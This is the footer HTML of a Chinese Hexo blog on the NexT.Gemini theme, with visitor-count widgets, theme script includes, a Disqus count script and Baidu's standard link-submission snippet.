  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>



<!-- 新增访客统计代码 -->

<div class="busuanzi-count">
    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="site-uv">
      <i class="fa fa-user"></i>
      访问用户： <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人
    </span>
    <div class="powered-by"></div>
    <span class="site-uv">
      <i class="fa fa-eye"></i>
      访问次数： <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次
    </span>
    <!-- 博客字数统计 -->
    <span class="site-pv">
      <i class="fa fa-pencil"></i>
      博客全站共： <span class="post-count">59.7k</span> 字
    </span>
</div>
<!-- 新增访客统计代码 END-->
        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  

    
      <script id="dsq-count-scr" src="https://于祥.disqus.com/count.js" async></script>
    

    

  




	





  














  





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  

</body>
</html>
